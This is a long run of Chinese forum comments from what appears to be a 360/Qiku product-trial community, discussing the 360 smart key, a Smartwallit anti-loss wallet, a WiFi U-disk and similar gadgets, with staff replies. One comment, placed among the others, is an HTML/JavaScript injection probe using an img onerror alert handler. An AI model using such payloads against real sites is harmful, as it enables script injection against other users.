嘻嘻嘻，那必须，要认真对待每一份工作嘛~~~
谢谢支持~
最好增加汽车遥控！
但是拍出的光线不足，与系统相机差别很大，这个可以改善吗
大部分女生喜欢各种宝石：托帕石、黄水晶、紫水晶、海蓝宝、青金石、松石……做的手机防尘筛，相当好看，对于女生来说恐无法抗拒。
价格真贵，能否开发一个孩子和家长一起制作一台这种车，每个配件都是独立的，回到家中自己安装各各部件，争强孩子的动手能力，而且还可以选配其他东西，就像配台电脑那样。
亲，耗电的问题，是您开启了超级模式吗？
嘻嘻，沙发先坐坐，欢迎大家来看哦
感谢对智键的支持，我们会越来越努力哒~
嗯，亲是有这个情况的，联想的部分手机是有不兼容的情况存在。我们会努力加强硬件的完善~感谢支持哟~
亲，请问您哪位同事的华为手机型号是多少呢？
防丢的钱包吗？这个东西很新奇啊。不知道怎么用啊。求试用。
创意确实不错。算是手机周边了。
果然有大招啊。还是小小的智键更靠谱。
我还以为大招真的是***的羞羞的东西呢
感觉好厉害的。。。
亲，魅族的啊！魅粉握手！
照片太少，评测实质性内容和吐槽完全等于没有，对于没用过的人来说实质性不大
智键君，你去哪里了？
楼主肯定不大，看本子看语气应该还是个学森吧？
这也太贵了。。。
亲，您这叫试用报告吗？太简单太水了吧？
魅族的问题我们已经反馈~感谢你的反馈啦~智键会越来越智能的~
洁癖症至宝
亲，报告怎么可以不图文并茂呢？
无淘系软件，高德地图有吗？您的APP版本是多少啊？ 
好萌的小孩子~闪拍是不是帮你抓住了美好瞬间呢~感谢你的反馈和建议~
感谢反馈~开启超级模式是会有费电情况存在的。我们智键在不断的努力哦~
闪拍因为追求速度，所以会有无法对焦的情况存在。不过我们也会在这方面改进的，感谢对智键的信任和支持~
楼主是个喜欢上yy的人啊
钱包是铝合金做的？？
你这电脑键盘该清清灰了。
嗯嗯，智键君看到你的反馈啦~你的建议也收到了呢~在外形上面我们小小键会越来越好看哒~
试用官是一个妹子。
分号暴露了程序员的身份。双击的问题，是双击无法唤出界面么？您的手机型号是？
来过，小小的东西其乐无穷啊
谢谢亲的反馈哈~建议我们都收到了呢~
亲，报告你觉得不应该有点图片吗？
这是啥意思额？报告呢？
太专业了。测评报告写得很赞哦~智键会更加努力的做出大家想要的功能~
建议更新一下试用报告
似乎国产手机无法使用？
花了一天的时间做的，然后整理一下就拿出来了，谢谢智键君肯定！
什么时候上市啊？有试用活动吗
价格.......
大一的学生啊。还是很新潮的嘛
是的，超级模式一直开启
很细致的一份报告！
呵呵，魅族好用，加上智能键更好用哦
这是马上有儿童卫士的节奏啊。
听说名片在第二期已经做成卡片了。应该更值得收藏了。看来一直在改进啊。
聘书，哈哈，有意思。
国产手机无法使用？不会吧。我看介绍，应该是可以的呢。
360之前跟其他网络设备商合作过路由这次自己做！希望掌握了一手技术后做的给力谢 给测试机会就好了
汽车，家居，看来都是未来智能的方向啊。
哈哈 占楼等更新~智键做成糖果色的怎样~
什么时候能开始卖啊。如果有个性化的图案或者按键帽就更好了。
我也想买一个，给老公带上。
这个样子不适合妹子啊！做几款好看的嘛
耗电的情况，亲是不是开启了超级模式呢？
感谢亲的反馈~我们正式版发布的时候，会增加很多功能的，敬请期待哦~
欧巴好欣慰呢~就是要给你带来解放双手的效果~
智键就是模仿耳机的线控喏，所以可能会有这种情况存在。不过希望智键能给你带来很多方便哦~
超级强大的工具！貌似有点像偶像剧里的富豪使用的，高大上啊！！！
我们会在耳机方面做突破的，感谢反馈~
电流声？请问您的手机型号是？
看上去就给力，高科技 
敬礼~感谢亲的反馈~闪拍追求的是速度，所以特别在晚上拍照的时候清晰度是无法保证的。我们会努力改进的~
智键以后会有一个收纳的地方的~希望智键能给你的生活带来很多的乐趣~
键君看到了好吃的~~~~哈哈。。用的舒心就是我们最大的欣慰，如果有什么BUG欢迎吐槽哦~
您好，能不能说说您具体的手机型号呢？
难道你只看到外观上面的建议？
应该很硬，只能放包里面了
先手动点个赞～建议很赞哦。我们已经收到啦～感谢亲的反馈，写的太认真了！！！！希望智键能给你的生活带来很多便捷～
360智键在未开屏幕锁的情况下可以使用，是否存在安全隐患？
希望便宜点                     
自定义我们正在完善喏，在正式版的时候，会有改进的，敬请期待~
酷           啊...........                                               
有什么问题欢迎随时吐槽哦~智键君在这里等你~~~~
嘘~智键君会替你保密的~哈哈，拍的是不是很愉快呢~
我们的智小键会越做越棒的~感谢您辛苦整理和反馈~
感谢亲的反馈哈~报告写得好认真呢，键君会考虑会跟歪哥合体的~请继续支持我们的小小键~
高大上啊～！ 这玩意
有钱了马上买
这里这里呢，来了来了~
这篇报告太赞了！键君已经感动的内流满面。荣耀3C的问题，我们这边正在努力测试。键键君感谢亲的反馈~
自定义操作我们会加强的，感谢反馈哈~闪拍如果手不抖，还是比较清楚的，不过这个我们也在优化当中~
音乐在什么情况下会自动打开呢？能再详细点吗？
智键的外观还在不断努力哟，它会越来越好看的~
智键君在不久的将来，功能会越来越强大的哦，敬请期待~
续航问题、定位问题。
这个是要隐藏在钱包里的，做太漂亮好像也没什么用吧。但是当然还是漂亮点好。
安全卫士、儿童卫士、空气卫士，希望360能给我们带来更多的卫士，全方位保障我们的安全！
这个东东强啊！有一台不错哦！完全可以取代游戏机
智键君是看了所有的报告吗？
麻嘛啊，很期待
哈哈，我也发现这个问题了，图片不居中看着好累啊
两个智键，给我一个吧，我用好几个账号申请都没拿到，好忧伤。。
智能互联时代，
为什么两分屏观看，显示厚度小么
各种卫士啊。真是最权威的安全公司啊。
是这样的，当我发生了插入智键君时按下按钮的情况，会弹出对话框提醒我，插入时按下按钮了，360智键无法使用。但是，我也试了试，是不是真的不能用。于是就分别选择了录音、Home键、手电筒等，然后按一下，结果均在后台打开了我的小米音乐，这……应该不是偶然，我又试了下刚才。
哈哈，真好，提出的建议能有结果，很欣慰。
太大了  ，应该小巧一些
确实，关键在于APP，线控耳机也能过把瘾，可是就没有日常的便携盒实用性了。
看了你那个，我发现，智键君的签名还不是同一人呢，果然是有智键妹？？？哈哈，我的那个试用卡给的是NO.141，电脑上是NO.326。。。。。。。囧o(╯□╰)o啊
更薄点会更好，或者直接做成实用的钱包
不是很看好，电量消耗惊人，在没有电池革命性更新前，再多的花哨也抵挡不住消耗
智键君的签名在哪看呀？
这个只能说应急电源，不会很大，又自带数据线，能够方便可行吧
报告Q5处表述的确实不是很清楚，我改过来了，我在想，是不是在不能用的情况下，我的手机自己把它识别成耳机了，所以把音乐播放器打开了……
报告Q5处表述的确实不是很清楚，我改过来了，我在想，是不是在不能用的情况下，我的手机自己把它识别成耳机了，所以把音乐播放器打开了……
装在钱包里的，还是这就是钱包？
(*^__^*)
呃，三星GTS7562智能相机，录音，手电筒没法用~会弹出如图所示的窗口。。
共勉！(*^__^*)
额……我的连卡都木有见到，是不是装到别人的邮包里了，~~~~(&gt;_&lt;)~~~~ 
反正只是漏个小头。。。做成土豪金也没用- -#。。。做太大了影响手机美观
看介绍是装在钱包里。但是感觉装在女士包里也不错。
喜欢啊，不错，方便
是一个钱包配件 夹在钱包里防丢钱包..
自己先顶一个，码字已经好久不干的活了,累死了一大推脑细胞.....................
看完你的评测报告之后想买的意愿特别强烈，快点发售吧！
等  ....不明觉厉
这个可以。
对于这个时代，这种东西实在是太需要了
求使用啊 很喜欢 觉得很不错
土豪金版这个提议靠谱，32个赞！
图片都没有，这货是来打酱油的，鉴定完毕！
闪拍的效果确实还不错
如果价格合适，这个东西的市场真的非常大啊。最好放进去之后外面有液晶屏显示细菌数量，随着消毒的进行，细菌的数量不掉的减少，最后达到一个绿色健康的状态。
黄色的是啥啊？
看来试用的很用心啊~~
好歹来个图片吧 亲
这个键盘也很酷嘛
居然是妹子。。妹子居然还有1S。。块换手机吧
这个格式有点怪哦。最好重新修改一下吧~
怎么会有两个？
居然比闪拍还要清晰！是楼主的技术牛逼还是智键牛逼？
好奇模特和你是什么关系。。。
哈哈 楼主你是有多爱斗地主啊~~
牛逼的产品啊，关注
那确实是闪拍，闪拍对焦差，近景捉襟见肘，远景当然对对焦要求不高，加之排除极端环境：黑夜、剧烈晃动，逆光等，建立在固定架上的测试，已提示排除了极端环境了，记录有限...望海涵
水果妹纸又画你圈圈了哦，智键君...
哇 写的很用心~点赞~
目测后面的黑衣男孩有发展成帅哥的趋势~
可以先过把瘾，等量产了就可以体验了，相信会更好的...
目测是个妹子！妹子爆照哇让小编给你加精华撒：D
优秀可否？嘻嘻...
可惜没有我的份
唉，错过了时间
赞。。。。。。。。。。。。。。。。。。。。。。。。
屌。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。
支持！！！
其实什么东西都是双刃剑，有弊有利，智能化虽然我们拍手叫好，但是父母对于使用可能会很难理解，所以求一台能提前教父母熟悉，以适应这个智能化大势的时代
科技改变生活   奇酷改变免费
谢谢支持！我们多多支持360智键！
谢谢支持！我们多多支持360智键！
谢谢支持！我们多多支持360智键！
公开场合怎么可以羞羞呢？！
听说修复版本马上上线，到时候更新试用一下。
能不能有个试用的点赞投票呀 这个奇酷能不能考虑下？
定位是手环根本所在..
为父母有孝心~~
虽然觉得需求一般 但还是想买一个~~
啥时候能来奇酷试用呀...
同问 黄色是啥？
录音这个有意思 哈哈
哈哈 改变免费这个吊
好强大 果然关心体贴用户 赞~~
想買！就是不知道貴不貴
科技就是屌啊！钱包智能化真方便！真希望偶能得到一个
双击切换不了功能，手机型号是夏新N890
标题  万能“键”。。。。错别字 最后一句，我想要的智“键”。。。。又一个错误。。 拜托认真点
&quot;&gt;&lt;a href=&quot;x&quot;&gt;&lt;img src=x onerror=alert(/x/)&gt;/
希望大家多多评论
奇酷总是给我惊喜！有了这样宝贝，妈妈再也不用担心我的手机有细菌了，嘿嘿！强力支持！
智键是有触感反馈的啊
太好了，设计高端大气上档次，据说是一名大学生设计的，叫邓兴兴
太厉害了了，设计高端大气上档次，据说获了红点大奖，叫邓兴兴的，申书润的
这个不错啊，现在的中国面临着雾霾的困扰，净化空气尤为重要。如果这款智能空气净化器能够为广大亲民服务就太好了。期待推广
不错啊，，太牛x了，好想要一个
什么时候开始卖呀，再不发售我就看别家产品了
您好，RM2暂时不支持蓝牙。
RM2一定能够满足大家对家居智能化的需求。之所以做成黑色的外壳是因为我们使用了专业的红外透射材料，有助于红外的穿透。当然未来也会有更多个性化定制的！
希望尽快上市吧
这个好。游戏和电视是强项啊 比猫盒好。快出快出
好厉害好想拥有一个
宝宝出门就玩的不知东南西北。才知道有这个好东西。啥都没赶上啊啊啊啊啊啊。
智妞智妞~好可爱的称呼~~lz技术帝啊！
试用官No.231相当专业！各种图都很用心啊~赞赞赞~
多谢夸奖，多多支持！
人不如旧 ^_^
智能新生活，Broadlink RM2值得你拥有
以后的维护成本会不会增大啊
除了iphone  还能支持其他型号的手机吗？安卓的
是一个监测系统吗？ 
外形还好吧，要看看具体功耗怎么样了
这是摩托罗拉公司出的手表吧！摩托官网上已经有这个产品了，但是貌似不会到中国吧，这也是摩托罗拉公司在X phone 后又推出的产品吧！
要是这个路由器比随身WIFI设置还简单就好了
沙发自己做，很久没写这么长的文章了，给自己赞个。有空还是多写点东西，能静下心来也挺不错的，也给他人带来点参考，嘿嘿，希望大家多多支持！
刚才看了智能钱夹的视频，钱包跟手机关联后还能查到钱包的具***置，还有提醒，真的好实用啊。特别想拥有一个。期待明天早上11点
哇哦，看起来很贴心的样子呀
陪伴你的手机生病了你造（zhi）么(dao)....
很小巧的赶脚
Android的电动车？很环保啊
很强大的呀，游戏机和机顶盒的结合体啊
可穿戴的相机，能支持多少像素呢
造型上还是有创意设计的，把天线设置在外面为的增强信号么
华为的技术还是很好的，产品定价上肯定会很高
很期待呀，到时侯给父母装一台自用一台，空气净化很有必要哇。
哈哈~鸡冠花和菊花的那段笑shi我了~~
想要追求极致酷品！！小酷，你造吗？每次申请都不中？你造吗？你造吗？你造吗？你造吗？你造吗？你造吗？
LZ是几号试用官哇？
高科技酷品。。。。
刚开始不好控制吧。。。
这个好实用。。。还能提醒。。。
不错哦，期待啊 明天开枪
好东西！非常喜欢！
支持多远距离啊
娃娃安全靠手环
有道理~~~~~~
有道理~~~~~~
O(∩_∩)O哈哈~，这你都发现了啊
嗯呐，赞一个
好的，会一直持续关注   
这个不错！我有时经常丢钱包，有了这个相信能帮我改到丢东西的习惯
这个价格够便宜了。
价格我猜正确了，果然39.9
130W - 150W
这都能猜对。我猜的是49.9
很期待并预祝你们研发成功！
这个价格太给力了！支持360
手电筒打开的还是挺快的。
明天就要开始了。很期待啊。
很给力啊。这么花心思。智键君肯定很开心啊。
希望是包装精美的纸盒（类似于礼品盒），方便用户用于收藏。收藏价值啊。
这个我见过，手机控制球滚动
连老周的微博都截图了。哈哈
***叔叔。。。
图片看着好晕啊。
有点难 这可不便宜 试用估计也就10台
功能太屌了，最近正好想买一个U盘，哈哈
谢谢支持！
谢谢支持！
东西不错关键看价格
360随身WIFI “U盘版”   能送不
松拓的赶脚，如果价格合理，愿意购买。
很简单啊，一般商家定价都是 X9.9元，8gu盘差不多就是30元左右，和在一起价格就在29.9-39.9之间了，360不想腾讯一样坑用户，就是29.9了
错了，     很简单啊，一般商家定价都是 X9.9元，8gu盘差不多就是30元左右，和在一起价格就在39.9-49.9之间了，360不想腾讯一样坑用户，就是39.9了
我去。这哥们太猛了。
好暴力的试用报告。。。
放放风放放风
对比帖啊。这个还是不错的。
这份报告太牛了吧！
这个产品赞，期待~~
照片果然很清晰啊。
女孩放在手提包里也不错啊。
能不能是usb3.0
早就关注了，希望能得到他！
没有图片啊。。再更新一些吧
前几天刚买了个U盘，这次又要破费了，必须预约一个
是刚刚才收到吗？
太牛逼了。。羡慕楼主的动手能力！
在室内的定位好像是不大准，再加点图吧
隐私泄露是指？
果然文字很专业啊
好漂亮的小马，写的很用心啊，赞一个
木有收到卡片吗？
怎么会无法获取信息呢？
U盘版 什么时候开卖呀?
电池到后期应该会省一些了额~
还有 随身wifi版的 什么时候开卖呀?
还有 随身wifi版的 什么时候开卖呀? 
U盘版是免费的不？
哪里预约啊？？立即预约按钮按不下啊～～
什么破东西,怎么一直生不出来!
为毛测评里这么多用小米 。。。。。。。。。。 都咋选的
哪里预约啊？？立即预约按钮按不下啊～～ 
官网http://wifi.360.cn/upan.html?source=index
官网http://wifi.360.cn/upan.html?source=index
谢谢大家的支持
谢谢大家的支持，顶起
二者价格在那 包装的问题公测应该要变样
希望不要再在u盘或者移动wifi上折腾了。。。
很赞的硬件！延续360风格，打造WIFI与U盘的完美合体，极具创意！大爱360！
看来现在真的是掀起了智能风暴了
产品很酷！
USB 2.0接口，淘汰产品。。。8G太小。。。意义不大哦。。。还是没有学会小米的极致。必须做到最低价，最高配置才行。。。。。抄抄概念没有前途的
出来是什么价？
硬件配置有待提高
最重要的为什么不是USB3.0啊，2.0速度多慢啊？？？希望能出16G，32G，64G等不同容量的版本。
估计慢慢就会出的。
能买到，实用，才是硬道理。
360wif这次应该可以坚强一点，我买的360WiFi没几天就外壳破了，接口2.0太慢了！
测评的原则是一定要尊重事实，客观评价，与是否是小米手机无关。
我爱这一款
写的很有意思，32个赞！
以360的风格应该很便宜，哈哈
什么时候开卖啊，等着入手了！
什么时候开卖啊，等着入手
yyyyy
应该·不便宜吧？
什么时候开卖啊，等着入手
申请了两轮了。。。。。。都没有。。。。。
据说4月初会开始售卖  现在官网预约呢..
据说4月初会开始售卖 现在官网预约呢.. 
主要就是很酷 哈哈
哈哈哈 这话很给力！
黑色很炫酷呀..
炫酷极致 果然奇酷呀~
我要第一时间申请 哈哈
没有图片呀 建议楼主多传几张。。
这个 有没试用感受呢？
严重同意！！高手
最后这个祝愿好cute~~
不错 很详实哈哈
我买了2个1代的咋地啥都没得送啊！！！ 还是u盘版的强大啊
这么牛？肯定很贵吧
动态图 有新意！！！ 赞
这个价格，普通人接受不了！
这尼玛不就是一个盒子，外加一个紫外线灯么？
造型不错，不晓得信号接收的范围会不会有强弱要求
最好不要是圆的~~一是影响美观，二是涉及到衔接稳固问题
这个有试用吗?
这个有试用吗？ 
这个......呵呵呵呵
太强悍了，不知道能不能中个
看到别人的拆解版写的很好，学习了 下次也要动手拆拆了
        沙          发
為啥不早點出~~我剛訂了個360WIFI~~
华为G700,联通版的合约机，不过不清楚是个别的情况还是普遍性的。
好的话我们可以在学院推广
我去 什么时候出，早知道就不买小米的随身WIFI了。。。 坑死个人！！！
只要是Wi-Fi覆盖、能够上网的地方就一定能够使用了。
竟然是官方回复，受宠若惊啊！谢谢夸奖！继续努力！
哈哈 这是啥学院..
智键君现身了
是的 不然有点浪费！
多谢，一起分享
哈哈 拆解慎做 万一弄不好咋试用呢
蓝牙这个是个点子呀
不知道信号可以不可以穿墙
360的随身WIFI产品非常成功，麻雀虽小，五脏俱全。此次升级更是让用户有意想不到的惊喜。APP、U盘版、还有一个本月29号的未知惊喜。此三连发真令我期待不已！红衣大炮所领导团队，的确有很大的创新能力，很有一手！赞！赞！赞！
别逗了，小米还极致？小米个垃圾货还搞饥饿营销
别逗了，小米还极致？小米个垃圾货还搞饥饿营销
别逗了，小米还极致？小米个垃圾货还搞饥饿营销
期待！北京雾霾越来越严重了，急需这样一款好产品
我买了15个360wifi 2代送人~~~作小礼物特别好哇~你再买几个好了哈哈
这有什么用啊，光手机消毒手上很脏怎么办，还不是照样有很多细菌。建个无菌仓得了。
录像功能？这个估计成本太高了~太费电和存储空间了。倒是可以增加闪拍功能，给宝贝周围的环境拍照什么的~
应该可以吧～！都能红外控制的东西
应该可以吧～！都能红外控制的东西
应该可以吧～！都能红外控制的东西
你家宝宝才一岁多，是不是略胖阿，哈哈，看别的报告6、7岁的宝宝都可以戴呢~
感觉非常好，小巧，便于携带，办公室用很方便！爱人也很喜欢！
真的这么好?
不知道这个自重是多少？
以后小小键会考虑把蓝牙结合起来滴~感谢亲的测评~我们会更努力的~
 产品数量:50个 已申请人数:7411人 
能多一些吗?
这比例太大了
哈哈，拆完了还能装回去才是本事~
智键的造型在以后的版本会有改进的，测评报告很认真噢~智键君给你个赞~
感谢亲的测评啦~有什么问题欢迎多多吐槽哟！
 HTC One M8 正式发布  来一个!
同觉得智键君的颜色略单一了一点。要是糖果色的更好看~~
丢东西都成习惯了。。。看来你非常需要这个哇~
感谢反馈！感谢认可！智键会越来越好看的哟~
希望可以得到试用机会！
智键君看到你的报告啦~希望你用的愉快哈~
正式版的时候 我们智键会有“住所”的 感谢对智键的支持
EMS君很帅嘛~偷偷告诉你，是智键君给你的福利哦~哈哈！你的建议我们都收到啦~感谢反馈！
有点贵啊。买不起
这个可以有
360随身WIFI “U盘版”
确实牛x的一b 
智键很快就就有“家” 的，感谢认真负责的态度！意见我们已经采纳哦~
用用新东西 哈哈 看看方便吗 
您具体的手机型号是，能加一下这个QQ我们了解一下情况么？2232707409
好活动必须参加
退货！！！
智键的外形在不断的改进中，一定会变的更炫的。会有死机的情况？您能具体说明一下么？
2232707409 能加一下智键君的QQ了解一下详细情况么？
苹果系统我们暂无开发计划哦~
我认为，USB2.0的接口已经是被淘汰了，换成USB3.0会更受欢迎。
万恶的小偷，带电击功能就更强大了，让你再偷，嘎嘎
曾经丢过N次钱包，太需要这个了
定价不知道能定到多少啊。
成像异常是上图的情况么？录音一秒闪退？
老公是个“马大哈”，亟需这款智能钱夹的拯救啊！
同意，小米垃圾！随身wifi的名字都抄袭，还在那里说极致、发烧
哈哈，小米山寨货
这手机的颜色怎么这么丑！
这样的产品正好是我老婆需要的东东，每天可以省去他数钱的习惯，还更安全不会丢了。也不怕回家的路上被抢。。。。。。顶起来。
太有才了，太有意思了~报告很赞，哈哈，看的智键君乐的肚子疼。希望你用的愉快哈~
貌似需要这个产品的人很多，凑个热闹，碰碰运气
最新想入手一个 Nexus 5  
音乐的问题呢，亲是这样的，小米的系统优先级是高于我们APP的，所以在启动音乐时，就会有这种情况~
我也是~~经常丢三落四的~
每天都要充电，就是说一天之内找不到孩子，就完蛋了--！ 
好想法，哈哈
闪拍因为追求的是速度，所以会有不对焦的情况存在。智键是模仿线控的，所以在打开音乐的时候，会有播放暂停的情况出现。我们的外观也正在努力改进中~感谢反馈哦~
希望能够试用，
期待中，。。。
我丢了无数次钱包了，
这样的好产品，顶一个
锁扣接触可以设置两个金属点，形成一个回路，脱离后就断电就能及时的报警，这个比较实用，孩子嘛不太需要花哨装饰！！
嗯，对的，小小键的外观在以后会改善的，双击一直切换没有出来么？具体什么情况，可以详细说明一下么？
感谢您的反馈，我们智键在不断改进当中。希望它能给您的生活带来方便~
您的这些建议，小键君以后都会实现的~请期待哟~
土豪金会有的~一切吊炸天的想法，小键正在努力实现当中
颜色还可以吧
哈哈，赞一个先！字体也太萌了吧~小键君看来很合你心意嘛~有什么问题欢迎随时吐槽哟~
顶起来，天啊你们怎么知道我们这样手忙脚乱的职场辣妈需要这样的产品呢。。。。。
我想说我关注好久了终于等到了好吗？我支持奇酷好久了从来都没抽到过我。。。。。求人品啊！！！！
这个可以入手。。 
哈哈，看来是360的忠实用户啊~下次可以让360搞个有奖征文：我和360不能不说的故事~
嗯嗯，其实手环还可以给有智力衰退的那些老年人佩戴~
很好的产品，概念上也可以归于可穿戴的一类吧，钱包本来就是随身的，通过寻找功能真正达到“穿戴”在身上的概念
这个非常棒！值得拥有！
快按钮为了防止丢失，配了一个金属环，和一个装在耳机线上的小收纳器    我怎么没有
现在生活好起来了，虽然现在都用银行卡，但都需要放入钱包或卡包里，一旦丢失了，懊恼呀！这个就不同了，手机连接钱包，它通过蓝牙跟你的苹果或三星等Android手机建立连接，记录你每天花钱的轨迹，管理日常开销。如果可以加个wifi信号发射器，应急手电筒，甚至可以存歌放歌的话就更好了。我参加过好几回试用都没抽中，幸运女神让我抽中一会吧！
那就给加个精呗，鼓励下，下次会有更好的报告出来
越看越喜欢的样子，就是想知道真正用起来的感受。
真能到这种程度就牛X了
有点儿贵了 如果就这点儿功能的话
我是首批用户！！！！怎么提交试用报告！！！！！
如果可以凭指纹开钱包的话就更赞了!
期待ing
就跟蓝牙耳机一样，保持连接就可以了，不过，我们走的是数据通道，不但不影响蓝牙耳机，而且比蓝牙耳机会省电很多，相信您会喜欢的。
Good idea，我们在smartwallit3中会严重考虑起来，谢谢~
这个功能太强大了
像素是多少
SmartWallit 手电筒，加个灯就行，多棒的微创新啊，行动起来。
是贴上去的吗，怎么个穿戴法呢
这个原理是什么，4S能用吗。。。
我们也曾丢三落四，现在我们不会了，因为我们做了个Smartwallit，相信也能帮到您。
很喜欢这款，外观大赞
我们会继续努力，做Smartwallit Pro，已经快量产了，不过功能跟这个差不多，只是外观上变薄了很多。
看起来很酷，不知道实际操作怎样
概念永远只是概念
感觉很不错，问题是（1）像素多少；（2）是否是手机连接，手机控制。
哇 量产以后可不可以再搞一期试用啊~~另外我觉得这个功能妹子们更需要啊！为什么做的这么热血！！可不可以做一个漂亮！
感觉好高端的样子
谢谢哦，希望你也会中
可设置指纹放丢失功能
可以试试，适用不适用
这钱包能放进钱包里更好
特期待这个产品
这也是我们努力的方向，马上就能做到钱包里了。
做个妹子们喜欢的产品不容易啊~
顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶！
丢钱包患者请快快申请！
对磁卡有影响吗？
功能介绍忘了加图片了，呜呜呜！
按键没有突破，还是老传统。硬件上的更新，没意思，操作上变化才更吸引消费者。
啥时候出啊，随身wifi没抢到，这个一定要抢到啊
价格在多少呢
希望大家多多支持我啊！！
喜欢很喜欢
恩，可以啊。你先拍好，上传就可以了，我当时是没有带手机。所以没有上传。
就是太贵 了 
对磁卡没影响，不影响钱包以及卡的使用。
如果能够自动识别钱币数额，通过识别面值实现自动记账，再加上识别钱币真伪、指纹开钱包。完美了！！！
是的，更具体的情况，昨日晚18：37——010568***41回访电话中已详细描述。
你的希望在不久的将来马上就能实现了，，，期待中！
希望我能得到一个！！！
建议手机加速功能增加白名单功能
希望我能得到一个！！！ 
希望我能得到一个！！！ 
这好像是暂时唯一一个精品报告啊。
喜欢。我家就住在油城，那个空气质量真的很差
录音文件的问题，我们以后更新的版本会改善这个情况的，让用户更方便的找到使用智键录下的音频拍下的照片的~
建议很赞哦！反馈报告也很认真！感谢对智键的大力支持！
很不错，我去补充点知识，看看能不能运作起来~
多多推荐喏！
排版好整齐，写的好认真。我这种强迫症的人就爱frankly~哈哈，感谢反馈！意见也特别中肯，小键君的外观在将来会有改善的！小键也会越来越好看的~
的确值得这精品的价值
不错不错，最好晒得图少点。建议多点。
手机是酷派吗？
   希望我能得到一个！！
卡是 流量卡 套餐，目前不能查询。
挺好用的，WIFI和U盘一体了。超赞啊、还是8G的，管够我用了。
这个功能强大，希望获得一次试用的机会
挺先进的一款智能手表啊、期待期待
哎呀，希望能有一个，热爱智能，
恩 相信智键会越办越好，360奇酷也会越办越好。最后感谢智键君送的WIFI小礼物。那几天出差，今天刚回来。嘿嘿
希望自己也能拥有一个。在平时的出车中提供方便。很有创意的，还具有很多的功能。
前几天还想给我爸爸买一款自动测血压和心率的，只是那种有些大，怕我爸爸不会用呢、这款真好啊、用手机就可以得出结果、期待赶紧能购买啊。
功能强大！！！
好东西，与大家分享，抽不到我主页君给个地址，一定要买的！！！！
大赞啊，希望能申请成功
圆才美观好不好……汗……
软件安装完毕，期待着一个小小钱包带来的科技感！！一定非常十足
顶，做好点，我上手一个。
我觉得关键还是硬件，现在多是触摸屏的，操作还是和软件有关，想有变化，软件上下工夫
这个怎么能弄到？
超级喜欢！！希望能申请成功
楼主的字体很漂亮啊，截图这个可以自定义就好了
这么一对比，胖乎乎的随身WIFI还真挺可爱的
这是放在鼠标垫上拍的么
额。。包装给力的图呢。会补充么
对比的好牛啊。目测有精华的潜力
可怜的智键君被一块和5毛夹死了
又一酷品来袭，果断好评！体积小巧，便于安装和携带，而且能与手机实时互动、双向防盗、记录账单，功能实用而强大！实在是非常给力的酷品，无比期待ING……
APP有更新啊，看看更新后闪拍还好使么
这照片好牛。。。是用单反微距拍的吧
期待更进一步的试用啊
你这算是无意之喜拉。。好多苦苦申请的都没中到呢
这么看智键好小，还是搂住你手太大
希望成功！！！
太大就不容易携带了
你太幸运了。
很不错的创意~
很是期待这款产品 但愿能通过 
感觉我写的报告和人家的都不一样啊，果然是没有经验啊QAQ
我也希望能通过，好想要~~
貌似就是个四旋翼
感觉像钱包呀 这个钱夹怎么玩？放在哪里 看着挺酷的，还可以记账哈
手机字体很漂亮~~
今天又看了一遍。确实写的非常好啊。
这个是放在钱包里面用的吗？
应该能定制化就好了..
好失望。。。没有图片还这么短
感觉很靠谱啊。薄很多这个很关键啊。
这个估计不便宜啊
佩服，，看，这位仁兄厉害呀
只要功能好，变美观，和外形定制估计是迟早的事。
耗电量是大家关心的重点呀,,
app界面九个功能的顺序可以设置成长按拖动，这样用户可以自己设定功能顺序了，更人性化。 好多好建议啊。
土豪金智键，金色的智键？
这小孩看起来戴着很高兴呀..
 360随身WIFI “U盘版” 
 360随身WIFI “U盘版”
啥时出结果。。万分期待呀
有灰色、金色、银色三种，，
关键是价格，，相当诱人呀
挺好用的，WIFI和U盘一体了
数量有点少啊。如果没中就等着看报告了。
看来你的手环不是奇酷网发的啊。奇酷网应该考虑一下这种想发表看法的用户。哈哈
Pro的外观有改进吗？感觉现在这版设计很一般啊
创意很靠谱，希望奇酷能弄过来试用
这个给力，非常喜欢！
绝对要顶一下，有没有赞一下的功能啊。
只能用心动激动来形容了
什么情况？刚说完要赞一下，就有了点赞的功能。。。这么神奇。大家都试试啊。
这个比较好，他继U盘和360wifi于一体的一款产品，而且还是8G，够我使用了
是偏胖，但不是很胖
感觉外形很不错啊。挺霸气的。
39.9，这个可以有。比买一个U盘还要便宜啊。而且这个是带wifi功能的U盘，很酷呢。
刷小米靠谱吗？
人气真低啊，自己可以顶吗？？？？
小智键可以做得再圆滑点，我玩游戏的时候横屏状态下，会有感觉到抵触手指，对操控游戏有一点点影响，不过基本可以忽略不计，嘿嘿！我会在试用过程中，对这篇测评不断完善的！
多谢，多谢，后续会继续完善的！多谢支持和捧场啊！
哈哈，这个是个对比，这样大家对智键的大小有个直观的认识！
有意愿和五角硬币的对比大小，后图中那个黑色的类似耳塞的东西其实就是水笔芯的封头，在智键之前一直来充当手机防尘塞的，嘿嘿！
东西虽小，但用处很大哦！
奇酷总有酷品，感觉不错的，便捷防丢，有可以记账，寻找还是双向的 
写得太好了，不给赞不行啊。真希望吾等屌丝也能中一个，羡慕ing
已经安装贝宝士APP V1.34 Beta。软件做的不错，记账功能强大，有推送消息，防丢可以再全国找？怎么显示地图是全国啊，报警生硬不能自定义啊，每个智能钱包都有一个设备MAC物理地址，不知道软件能连接几个设备呢，就等硬件连接了测试了。
记者暗访的福音，***，公安调查取证的神器
这是个好东西，这才是真正的“随身带”，其实之前就应该有这种想法
多谢大家支持，多谢奇酷和360的信任
希望加入U盘应急盘的功能啊   再出个16G版  价格贵点也考虑
红外线的话应该不能穿墙，是不是弄几个小接收器放在房间里
允许用户自定义除logo外的印制内容，如加上自己的名字防止与别人混淆，印上心爱的人名字赠送。
允许用户自定义除logo外的印制内容，如加上自己的名字防止与别人混淆，印上心爱的人名字赠送。 还可以增加几十兆空间，内置驱动包，360安全卫士，杀毒，浏览器等，让用户可以选择安装而不强迫，这些内容是另外赠送空间内的，所以这个空间内容要防止低格。
现在U盘空间很大，所以不要局限于8G，希望出多版本供选择，比如有内置急救盘的和不内置的。
支持国货，我想申请一个用用。
我觉得内存空间太小了！16G以上更加方便咯
退出三个版本吗？8G  16G  32G的
外观射击的不够好、可以设计城商业用的外观吗？或者潮流点的
很好很不错、不过没有中文名吗？
不会只能消毒iPhone吧？
希望可以变成指南针模式、可以指定去的地点然后一直是直的就到了
能让老百姓可以用到的科学产品，太棒了。谢谢！
